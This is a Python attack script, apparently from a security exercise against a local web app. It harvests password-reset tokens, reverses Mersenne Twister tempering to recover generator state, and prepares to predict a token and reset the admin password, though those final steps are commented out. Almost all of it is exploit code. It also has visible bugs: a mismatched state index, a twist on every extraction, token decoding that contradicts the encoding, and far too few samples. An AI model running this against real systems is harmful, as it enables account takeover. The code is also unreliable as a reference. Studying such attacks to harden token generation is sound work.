import base64
from urllib.parse import urljoin
from bs4 import BeautifulSoup, Comment
import requests
#Mersenne Twister MT 19937
class MT19937:

	(W, N, M, R) = (32, 624, 397, 31)
	A = 0x9908B0DF
	U, D = 11, 0xFFFFFFFF
	S, B = 7, 0x9D2C5680
	T, C = 15, 0xEFC60000
	L = 18
	F = 1812433253

	def __init__(self, seed):
		if isinstance(seed, bytes):
			seed = int.from_bytes(seed, 'big')
		#seed = seed & 0xFFFFFFFF

		self.lower_mask = (1 << self.R) - 1
		self.upper_mask = self.D & -self.lower_mask
		self.MT = [0] * self.N
		self.idx = self.N

		self.MT[0] = seed
		for i in range(1, self.N):
			self.MT[i] = self.D & (self.F * (self.MT[i-1] ^ 
												(self.MT[i-1] >> (self.W-2))) + i)
		return

	#Extract a tempered value based on MT[index]
	#calling twist() every n numbers
	def extract_number(self):
		if self.idx >= self.N:
			if self.idx > self.N:
				raise Exception("No seed present")
		self.twist()

		y = self.MT[self.idx]
		y = y ^ ((y >> self.U) & self.D)
		y = y ^ ((y << self.S) & self.B)
		y = y ^ ((y << self.T) & self.C)
		y = y ^ (y >> self.L)

		self.idx += 1
		return self.D & y

	#Generate the next n values from the series x_i 
	def twist(self):
		for i in range(self.N):
			x = (self.MT[i] & self.upper_mask) + (self.MT[(i+1) % self.N] & self.lower_mask)
			xA = x >> 1
			if x % 2 != 0:
				xA = xA ^ self.A
			self.MT[i] = self.MT[(i + self.M) % self.N] ^ xA
		self.idx = 0

	# added this to set the initial state of the generator 
	def set_state(self, state):
		if len(state) != self.N:
			# Corrected error message with f-string for proper variable interpolation
			raise ValueError(f"State array must be of length {self.N}")
		self.MT = state
		self.index = self.N  # Ensures the generator is ready to "twist" upon the next generation request 


def reverse_right_xor(y, shift):
    unaffected_mask = (1 << shift) - 1
    while unaffected_mask < 0xFFFFFFFF:
        y ^= (y >> shift) & unaffected_mask
        unaffected_mask = (unaffected_mask << shift) | ((1 << shift) - 1)
    return y

def reverse_left_xor_and(y, shift, and_mask):
    unaffected_mask = (0xFFFFFFFF >> shift) << shift
    while unaffected_mask:
        y ^= (y << shift) & and_mask & unaffected_mask
        unaffected_mask &= ~(and_mask << shift)
        unaffected_mask >>= shift
    return y

def unmix(y):
    y = reverse_right_xor(y, 18)
    y = reverse_left_xor_and(y, 15, 0xefc60000)
    y = reverse_left_xor_and(y, 7, 0x9d2c5680)
    y = reverse_right_xor(y, 11)
    return y

# given a token use our u-mix function to decode the token
def decode_and_reverse(token):
	reversed_integers = []

	try:
		decoded_bytes = base64.b64decode(token)
		# Assuming the expected byte length is a multiple of 4 for 32-bit integers  # Return the empty list if the condition is not met
		
		integers = [int.from_bytes(decoded_bytes[i:i+4], 'big') for i in range(0, len(decoded_bytes), 4)]
		print()
		reversed_integers = [unmix(integer) for integer in integers]
	except Exception as e:
		print(f"Error processing token: {e}")

	return reversed_integers


# since server uses a basic url approach, just parsing url for token
def extract_token_from_html(response):
	soup = BeautifulSoup(response.text, 'html.parser')

	# Find all <p> tags
	p_tags = soup.find_all('p')
	print(p_tags)
	for p in p_tags:
		# Assuming the token is directly the text of a <p> tag
		# and that it contains some identifiable part of the token format,
		# such as being a base64 string or having a specific prefix.
		if "token" in p.text:
			# Extract and return the token
			return extract_only_token(p.text.strip())  # .strip() removes any leading/trailing whitespace

	return None # Return None if no token was found

def extract_only_token(token_string):
    # First, find the start of the token parameter in the URL
    token_start = token_string.find('token=') + len('token=')
    # Then, find the end of the token, which might be the space or newline after the token
    token_end = token_string.find(' ', token_start)  # Assuming a space terminates the token
    if token_end == -1:  # If no space found, it might be terminated by a newline
        token_end = token_string.find('\n', token_start)
    if token_end == -1:  # If still not found, assume the token goes till the end of the string
        token_end = len(token_string)
    # Extract the token using the indices found
    token = token_string[token_start:token_end].strip()
    return token



def collect_tokens(base_url, forgot_password_endpoint, username):
	tokens = []
	for i in range(10):
		full_url = urljoin(base_url, forgot_password_endpoint)
		response = requests.post(full_url, data={'user': username})
		if response.status_code == 200:
			token = extract_token_from_html(response)
			if token:
				tokens.append(token)
			else:
				print("Token not found in response.")
		else:
			print(f"Failed to request password reset for {username}. Status Code: {response.status_code}")
	return tokens

# now that the generator is at the initial state, we predict the future tokens
def predict_next_token(mt_instance):
    predicted_values = [mt_instance.extract_number() for i in range(8)]
    token = ":".join(str(value) for value in predicted_values)
    return base64.b64encode(token.encode('utf-8'))

# attempt to go into admin user and change token
def reset_admin_password(base_url, reset_endpoint, token, new_password):
    data = {'token': token, 'password': new_password}
    response = requests.post(f"{base_url}/{reset_endpoint}", data=data)
    return response

# realized way too late into coding this that only regular user tokens
# show up in html, was stuck getting response 200 for so long
def register_user(base_url, username, password):
    register_endpoint = "/register"
    data = {'user': username, 'password': password}
    response = requests.post(f"{base_url}{register_endpoint}", data=data)
    if response.status_code == 200:
        print(f"User {username} registered successfully.")
    else:
        print(f"Failed to register user {username}. Status Code: {response.status_code}")

if __name__ == "__main__":
	# collecting the tokens
	base_url = "http://0.0.0.0:8080"
	endpoint = "/forgot"
	dummy_user = "test1"
	dummy_pass = "hehe"

		
	register_user(base_url, dummy_user, dummy_pass)
	tokens = collect_tokens(base_url, endpoint, dummy_user)	
	print(tokens)


	decoded_and_reversed = []
	for token in tokens:
		# Decoding and reversing the token to get integers
		integers_from_token = decode_and_reverse(token)
		# Verify you get exactly 8 integers from each token
		
		decoded_and_reversed.extend(integers_from_token)
	print(len(decoded_and_reversed))
	# generate new instance of MT with initial state
	# mt_clone = MT19937(0)  # Initialize with a dummy seed
	# mt_clone.set_state(decoded_and_reversed)

	# predicted_token = predict_next_token(mt_clone)

	# #reset password
	# reset_endpoint = "reset"
	# new_password = "imgoated"  # Choose a new password for the admin
	# reset_admin_password(base_url, reset_endpoint, predicted_token, new_password)

